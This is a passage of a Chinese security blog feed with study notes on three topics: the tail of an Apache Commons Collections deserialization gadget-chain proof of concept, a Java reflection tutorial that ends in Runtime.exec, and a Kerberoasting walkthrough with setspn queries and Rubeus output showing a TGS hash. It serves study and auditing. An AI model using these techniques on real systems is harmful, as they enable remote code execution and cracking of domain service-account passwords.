class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line">        <span class="keyword">Class</span>&lt;? <span class="keyword">extends</span> Transformer&gt; aClass = transformerChain.getClass();</span><br><span class="line"></span><br><span class="line">        Field iTransformers = aClass.getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException calc = getObject(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object o = objectInputStream.readObject(); <span class="comment">//将byte数组输入流反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201108124637.png" alt></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://b1ue.cn/archives/166.html" target="_blank" rel="noopener">https://b1ue.cn/archives/166.html</a></p><p><a href="https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.secpulse.com/archives/137940.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/137940.html</a></p><p><a href="https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/" target="_blank" rel="noopener">https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p><p><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></p><p><a href="https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知社区:&lt;a href=&quot;https://xz.aliyun.com/t/8500&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="cc链" scheme="https://shu1l.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>java学习--反射机制</title>
    <link href="https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/"/>
    <id>https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/</id>
    <published>2020-11-25T08:39:33.000Z</published>
    <updated>2021-08-20T14:22:01.985Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p><h3 id="反射的具体使用步骤"><a href="#反射的具体使用步骤" class="headerlink" title="反射的具体使用步骤"></a>反射的具体使用步骤</h3><p>在调用<code>Java</code>反射机制，主要步骤包括：</p><ul><li>获取 目标类型的<code>Class</code>对象.</li><li>通过 <code>Class</code> 对象分别获取<code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code> 类对象.</li><li>通过 <code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code>类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作.</li></ul><h4 id="反射获取类的class对象"><a href="#反射获取类的class对象" class="headerlink" title="反射获取类的class对象"></a>反射获取类的class对象</h4><p>要想使用反射，我们首先需要获得代操作的类所对应的Clas对象。</p><p><strong>1.常用的获取Class对象有四种方法：</strong></p><ul><li>使用Class类的静态方法</li></ul>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li>使用类的.class语法</li></ul>  <figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = <span class="keyword">String</span>.<span class="keyword">class</span>;</span><br></pre></td></tr></table></figure><ul><li>使用对象的getClass()方法</li></ul>  <figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">new</span> <span class="keyword">String</span>(<span class="string">"Hello"</span>);</span><br><span class="line">Class clz = <span class="built_in">str</span>.getClass();</span><br></pre></td></tr></table></figure><ul><li>Type语法</li></ul>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; classType = <span class="type">Boolean</span>.<span class="keyword">TYPE</span>; </span><br><span class="line">    <span class="keyword">System</span>.<span class="keyword">out</span>.println(classType);</span><br></pre></td></tr></table></figure><h4 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h4><p>常用两种方法:</p><ul><li>通过 Class 对象的 newInstance() 方法，<strong>只能使用默认的无参数构造方法。</strong></li></ul>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clz = pen.<span class="keyword">class</span>;</span><br><span class="line">Pen pen = (pen)clz.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure><ul><li>通过 Constructor 对象的 newInstance() 方法,<strong>可以选择特定的构造方法。</strong></li></ul>  <figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = pen.<span class="keyword">class</span>;</span><br><span class="line"><span class="function"><span class="keyword">Constructor</span> <span class="title">constructor</span> = <span class="title">clz</span>.<span class="title">getConstructor</span><span class="params">()</span>;</span></span><br><span class="line">Pen pen = (Pen)<span class="function"><span class="keyword">constructor</span>.<span class="title">newInstance</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure><h4 id="反射获取并调用类的构造函数-Constructor"><a href="#反射获取并调用类的构造函数-Constructor" class="headerlink" title="反射获取并调用类的构造函数(Constructor)"></a>反射获取并调用类的构造函数(Constructor)</h4><h5 id="1-获取所有公有构造函数"><a href="#1-获取所有公有构造函数" class="headerlink" title="1.获取所有公有构造函数"></a>1.获取所有公有构造函数</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Constructor</span>[] <span class="title">conArray</span> = <span class="title">clazz</span>.<span class="title">getConstructors</span><span class="params">()</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br></pre></td></tr></table></figure><h5 id="2-获取所有的构造函数-包括：私有、受保护、默认、公有"><a href="#2-获取所有的构造函数-包括：私有、受保护、默认、公有" class="headerlink" title="2.获取所有的构造函数(包括：私有、受保护、默认、公有)"></a>2.获取所有的构造函数(包括：私有、受保护、默认、公有)</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conArray = clazz.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="3-获取公有、无参的构造函数"><a href="#3-获取公有、无参的构造函数" class="headerlink" title="3.获取公有、无参的构造函数"></a>3.获取公有、无参的构造函数</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = clazz.get<span class="constructor">Constructor(<span class="params">null</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"con = "</span> + con);</span><br><span class="line">Object obj = con.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure><h4 id="反射获取并调用类的成员方法-Method"><a href="#反射获取并调用类的成员方法-Method" class="headerlink" title="反射获取并调用类的成员方法(Method)"></a>反射获取并调用类的成员方法(Method)</h4><h5 id="1-反射有参数方法"><a href="#1-反射有参数方法" class="headerlink" title="1.反射有参数方法"></a>1.反射有参数方法</h5><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class a = Class.forName(<span class="string">"org.xiaopan.fanshe.Pen"</span>);</span><br><span class="line">Pen pen =(Pen) a.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span>[] b(<span class="keyword">String</span>[] b)</span><br><span class="line">Method m = a.getMethod(<span class="string">"b"</span>,<span class="keyword">String</span>[].class);<span class="comment">//获取方法，需要指定要获取的方法名</span></span><br><span class="line"><span class="keyword">String</span>[] strs = (<span class="keyword">String</span>[]) m.invoke(pen, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="keyword">new</span> <span class="type">String</span>[]&#123;<span class="string">"str1"</span>,<span class="string">"str2"</span>,<span class="string">"str3"</span>&#125;&#125;); <span class="comment">//使用new Object[]&#123;&#125;形式传入</span></span><br></pre></td></tr></table></figure><h5 id="2-反射无参数方法"><a href="#2-反射无参数方法" class="headerlink" title="2.反射无参数方法"></a>2.反射无参数方法</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName("org.xiaopan.fanshe.Pen");</span><br><span class="line">Pen pen =(Pen) a.newInstance();</span><br><span class="line"><span class="built_in">public</span> <span class="type">void</span> a()</span><br><span class="line"><span class="keyword">Method</span> m = a.getMethod("a", <span class="keyword">null</span>);</span><br><span class="line">m.invoke(pen,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><h5 id="3-反射静态方法"><a href="#3-反射静态方法" class="headerlink" title="3.反射静态方法"></a>3.反射静态方法</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName(<span class="string">"org.fanshe.test.Pen"</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> c()</span><br><span class="line">Method m = a.getMethod(<span class="string">"c"</span>);</span><br><span class="line">m.invoke(<span class="keyword">null</span>); <span class="comment">//静态方法，直接调用，类对象传入null即可。</span></span><br></pre></td></tr></table></figure><h4 id="反射获取类的成员属性-amp-赋值-Field"><a href="#反射获取类的成员属性-amp-赋值-Field" class="headerlink" title="反射获取类的成员属性&amp;赋值(Field)"></a>反射获取类的成员属性&amp;赋值(Field)</h4><h5 id="1-反射公共属性"><a href="#1-反射公共属性" class="headerlink" title="1.反射公共属性"></a>1.反射公共属性</h5><p>通过Class对象的etFields() 方法获取 Class 类的属性。只能获取公有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">Fields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-反射私有属性"><a href="#2-反射私有属性" class="headerlink" title="2.反射私有属性"></a>2.反射私有属性</h5><p>通过Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">DeclaredFields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反射调用Runtime-getRuntime执行本地代码"><a href="#反射调用Runtime-getRuntime执行本地代码" class="headerlink" title="反射调用Runtime,getRuntime执行本地代码"></a>反射调用Runtime,getRuntime执行本地代码</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/web/242967.html" target="_blank" rel="noopener">Java代码审计基础之反射 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/pange1991/article/details/81175350" target="_blank" rel="noopener">(4条消息) Java反射详解_潘建南的博客-CSDN博客</a></p><p><a href="https://juejin.cn/post/6844904005294882830#heading-11" target="_blank" rel="noopener">Java 反射由浅入深 | 进阶必备 (juejin.cn)</a></p><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">Java反射机制 · 攻击Java Web应用-[Java Web安全] (javasec.org)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，&lt;strong&gt;对象可以通过反射获取
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>kerberosating攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:04:33.000Z</published>
    <updated>2021-08-20T04:44:10.191Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p><p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p><ul><li>使用<strong>域用户</strong>的NTLM加密认证请求票据</li><li>KDC使用<strong>Krbtgt账号</strong>的NTLM加密认证后的票据TGT</li><li>KDC使用<strong>运行服务的服务账号</strong>的NTLM加密授权票据TGS</li></ul><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805123917.png" alt></p><p>​            当发布Windows 2000和Active Directory时，微软打算在 Windows NT 和Windows 95 上也支持Active Directory，这意味着不仅会产生各种各样的安全问题也会导致更多不安全的配置方式。同时，也意味着，微软要保证在多个不同版本的 Windows 客户端上均支持Kerberos协议。</p><p>​            要实现这个想法的一个简单的办法就是在Kerberos协议中使用<strong>RC4加密算法</strong>·，并将<strong>NTLM密码哈希</strong>作为该加密算法的私钥，该私钥可用于加密或签名Kerberos票证。因此，对于攻击者来说，一旦发现了 NTLM 密码哈希，就可以随意使用，包括重新拿回Active Directory域权限（比如：黄金票证和白银票证攻击）。</p><h4 id="SPN（ServicePrincipal-Names-服务主体名称"><a href="#SPN（ServicePrincipal-Names-服务主体名称" class="headerlink" title="SPN（ServicePrincipal Names)服务主体名称"></a>SPN（ServicePrincipal Names)服务主体名称</h4><p>官方文档：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p><p>全称<code>Service Principal Names</code></p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p><p>SPN分为两种，一种注册在<strong>AD上机器帐户(Computers)</strong>下，另一种注册在<strong>域用户帐户(Users)</strong>下</p><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p><strong>SPN的格式</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass<span class="regexp">/host:port/</span>servicename</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805125050.png" alt></p><p><strong>查询SPN</strong></p><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p><h6 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h6><p>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>查看test域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -T test -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h4 id="简述Kerberosating攻击"><a href="#简述Kerberosating攻击" class="headerlink" title="简述Kerberosating攻击"></a>简述Kerberosating攻击</h4><p>Kerberos使用公开的对称加密算法</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">y</span> = f (<span class="symbol">x</span>,key)</span><br></pre></td></tr></table></figure><ul><li>F为已知的对称加密算法 ，如<strong>RC4-HMAC</strong></li><li>x为待加密的数据，包含时间戳，其他为固定格式的内容, </li><li>key为加密密钥，即NTLM</li><li>y为加密后的数据</li></ul><p>如果能从Kerberos域网络中获取y,则根据已知算法f，使用不同的f可推算出不同的x。 由于x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的是否为要寻找的口令.</p><h5 id="选择SPN服务账号的原因"><a href="#选择SPN服务账号的原因" class="headerlink" title="选择SPN服务账号的原因"></a>选择SPN服务账号的原因</h5><p>在域内主要有<strong>主机账号</strong>、<strong>用户账号</strong>、<strong>服务账号</strong>等3种主要账号类型 </p><ul><li>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。</li><li>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等</li><li>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</li></ul><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ul><li><p>查询SPN，找到有价值的SPN</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li><p>请求服务票据(tgs)</p></li><li><p>导出服务票据(tgs)</p></li><li><p>重写服务票据&amp;RAM注入</p></li></ul><h5 id="实现Kerberoasting攻击的前提"><a href="#实现Kerberoasting攻击的前提" class="headerlink" title="实现Kerberoasting攻击的前提"></a>实现Kerberoasting攻击的前提</h5><ul><li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。(<strong>服务密码一般默认为弱密码</strong>)</li><li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li><li>域内的主机都能查询SPN。</li><li>域内的任何用户都可以向域内的任何服务请求TGS。</li></ul><h4 id="Kerberoasting攻击的利用"><a href="#Kerberoasting攻击的利用" class="headerlink" title="Kerberoasting攻击的利用"></a>Kerberoasting攻击的利用</h4><h5 id="使用-Rubeus工具"><a href="#使用-Rubeus工具" class="headerlink" title="使用 Rubeus工具"></a>使用 Rubeus工具</h5><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>这是一个专门针对Kerberos的工具包，这个编译好像比较费事。。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      |<span class="string"> </span>|</span><br><span class="line"> _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line">|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">|<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"></span><br><span class="line"><span class="string">v1.5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : zeo</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : asdf/asdfasdf</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : sqlservice</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : 